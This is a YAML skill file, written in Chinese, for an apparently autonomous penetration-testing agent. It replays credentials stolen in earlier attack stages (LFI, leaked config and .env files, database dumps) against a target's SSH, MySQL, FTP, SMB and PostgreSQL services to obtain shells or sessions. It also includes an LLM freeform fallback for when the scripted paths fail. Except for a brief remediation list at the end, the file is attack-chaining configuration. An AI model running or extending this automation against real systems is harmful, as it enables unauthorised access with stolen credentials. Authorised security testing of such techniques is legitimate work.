skill_id: credential_replay
name: "凭据复用攻击 (前序漏洞抓到的凭据 -> SSH/MySQL/SMB/FTP/RDP/PostgreSQL)"
category: credential
phase: foothold
version: "1.0"

principle: |
  当前序阶段（LFI 读 wp-config.php / 配置文件泄露 / .env 泄露 / phpinfo /
  spring actuator / 数据库 dump 等）抓到了真实用户名/密码后，
  这些凭据在多个服务上**有大概率复用**——尤其在内部网络与运维不规范的环境。

  本 Skill 不再用固定字典爆破，而是把 ``confirmed_facts.creds`` 里的
  **真实凭据**重放到所有匹配端口（SSH/MySQL/SMB/FTP/RDP/PostgreSQL/Redis），
  命中即立刻拿 shell 或登录会话。匹配链路：
    1) VulnAgent.run(seeds={"credentials": [...]}) 触发后会合成
       service-level 的 "credential-replay" finding（tool=cred-replay）;
    2) 本 Skill 的 match.rules 命中该 finding；
    3) SkillEngine 把 confirmed_facts.creds 解开为
       {known_users_b64} / {known_passwords_b64} / {known_cred_pairs_b64};
    4) exploit_paths 通过 base64 -d 解码后直接 sshpass / mysql -p / smbclient
       重放每一条凭据。
  base64 注入是必要的：原文带换行/引号/$号会破坏 bash 语法。

match:
  rules:
    # 由 VulnAgent._synthesize_credential_replay_findings 合成
    - tool_is: "cred-replay"
    # 服务级 finding 也可以触发（在已有 known_creds 的前提下）
    - service_is: "ssh"
      port_is: [22, 2211, 2222]
    - service_is: "mysql"
      port_is: [3306]
    - service_is: "ftp"
      port_is: [21]
    - service_is: "smb"
      port_is: [139, 445]
    - service_is: "rdp"
      port_is: [3389]
    - service_is: "postgres"
      port_is: [5432]
    # 跨 Skill 事件触发：LFI 文件提取成功后自动激活凭据重放
    - variable_present: ["has_known_creds"]
    - variable_present: ["ssh_key_found"]
    - variable_present: ["shadow_readable"]

probes:
  - id: detect_known_creds
    description: "检查是否真的有可复用凭据，没有就直接退出"
    skip_if:
      has_known_creds: false
    command: "bash {skill_dir}/scripts/detect_known_creds.sh '{known_users_b64}' '{known_passwords_b64}'"
    timeout: 10
    parse_rules:
      - if_contains: ["PROBE_DONE"]
        set: { creds_loaded: true }

  - id: detect_target_services
    description: "确认目标上有哪些可复用服务在监听"
    depends_on: { creds_loaded: true }
    command: "bash {skill_dir}/scripts/detect_target_services.sh {TARGET_IP}"
    timeout: 30
    parse_rules:
      - if_regex: "PORT_OPEN:22\\b"
        set: { svc_ssh: true }
      - if_regex: "PORT_OPEN:2211\\b"
        set: { svc_ssh: true, ssh_alt_port: "2211" }
      - if_regex: "PORT_OPEN:2222\\b"
        set: { svc_ssh: true, ssh_alt_port: "2222" }
      - if_regex: "PORT_OPEN:21\\b"
        set: { svc_ftp: true }
      - if_regex: "PORT_OPEN:3306\\b"
        set: { svc_mysql: true }
      - if_regex: "PORT_OPEN:5432\\b"
        set: { svc_postgres: true }
      - if_regex: "PORT_OPEN:445\\b"
        set: { svc_smb: true }
      - if_regex: "PORT_OPEN:3389\\b"
        set: { svc_rdp: true }

exploit_paths:
  # --- SSH 凭据复用：最常见，第一优先级 ---
  - path_id: ssh_replay
    name: "SSH 凭据复用"
    priority: 1
    conditions:
      svc_ssh: true
    skip_if:
      has_known_creds: false
    steps:
      - id: ssh_replay_pairs
        description: "优先尝试 user:password 配对（同源精确凭据），再走笛卡尔积"
        command: "bash {skill_dir}/scripts/ssh_replay_pairs.sh {TARGET_IP} '{known_users_b64}' '{known_passwords_b64}' '{known_cred_pairs_b64}'"
        timeout: 180
        success_criteria:
          stdout_regex: "(SSH_LOGIN_OK:|uid=\\d+\\(\\w+\\))"
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "ssh_shell"

  # --- MySQL 凭据复用 ---
  - path_id: mysql_replay
    name: "MySQL 凭据复用"
    priority: 2
    conditions:
      svc_mysql: true
    skip_if:
      has_known_creds: false
    steps:
      - id: mysql_replay_pairs
        description: "用已知密码尝试 mysql 登录并枚举库表"
        command: "bash {skill_dir}/scripts/mysql_replay_pairs.sh {TARGET_IP} '{known_users_b64}' '{known_passwords_b64}'"
        timeout: 90
        success_criteria:
          stdout_contains_any: ["MYSQL_LOGIN_OK", "@@hostname"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "mysql_session"

  # --- FTP 凭据复用 ---
  - path_id: ftp_replay
    name: "FTP 凭据复用"
    priority: 3
    conditions:
      svc_ftp: true
    skip_if:
      has_known_creds: false
    steps:
      - id: ftp_replay_pairs
        description: "用已知凭据列 FTP 根目录"
        command: "bash {skill_dir}/scripts/ftp_replay_pairs.sh {TARGET_IP} '{known_users_b64}' '{known_passwords_b64}'"
        timeout: 90
        success_criteria:
          stdout_contains_any: ["FTP_LOGIN_OK"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "ftp_session"

  # --- SMB 凭据复用 ---
  - path_id: smb_replay
    name: "SMB 凭据复用 (smbclient/netexec)"
    priority: 4
    conditions:
      svc_smb: true
    skip_if:
      has_known_creds: false
    steps:
      - id: smb_replay_pairs
        description: "用已知凭据枚举共享 + 验证登录"
        command: "bash {skill_dir}/scripts/smb_replay_pairs.sh {TARGET_IP} '{known_users_b64}' '{known_passwords_b64}'"
        timeout: 120
        success_criteria:
          stdout_contains_any: ["SMB_LOGIN_OK"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "smb_session"

  # --- PostgreSQL 凭据复用 ---
  - path_id: postgres_replay
    name: "PostgreSQL 凭据复用"
    priority: 5
    conditions:
      svc_postgres: true
    skip_if:
      has_known_creds: false
    steps:
      - id: pgsql_replay
        description: "psql 登录 + 列库"
        command: "bash {skill_dir}/scripts/postgres_replay_pairs.sh {TARGET_IP} '{known_users_b64}' '{known_passwords_b64}'"
        timeout: 90
        success_criteria:
          stdout_contains_any: ["PGSQL_LOGIN_OK"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "pgsql_session"

  # --- LLM 兜底（只有上面所有路径都失败时）---
  - path_id: llm_freeform
    name: "LLM 自由推理（兜底）"
    priority: 99
    mode: react_freeform
    max_rounds: 3

remediation: |
  1. 严禁多服务复用同一凭据；不同服务（尤其管理面）使用独立强密码或密钥认证
  2. 配置文件（wp-config / .env / application.yml 等）权限收紧、不对外可读
  3. 数据库账户仅授予最小权限，禁用 wildcard host
  4. 启用 fail2ban / 服务侧锁定策略防止暴力枚举
